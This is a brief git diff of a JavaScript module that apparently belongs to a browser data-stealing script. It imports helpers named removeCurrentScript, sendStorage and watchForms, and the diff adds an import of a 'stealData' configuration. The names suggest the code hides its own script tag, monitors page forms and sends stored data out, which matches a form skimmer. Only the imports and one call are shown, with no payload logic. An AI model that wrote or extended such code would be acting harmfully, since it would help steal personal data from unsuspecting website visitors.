@@ -2,6 +2,7 @@ import {Client} from '2sweet'
 import removeCurrentScript from '@functions/removeCurrentScript'
 import sendStorage from './sendStorage'
 import watchForms from './watchForms'
+import {stealData} from '@config'
 
 removeCurrentScript()
 
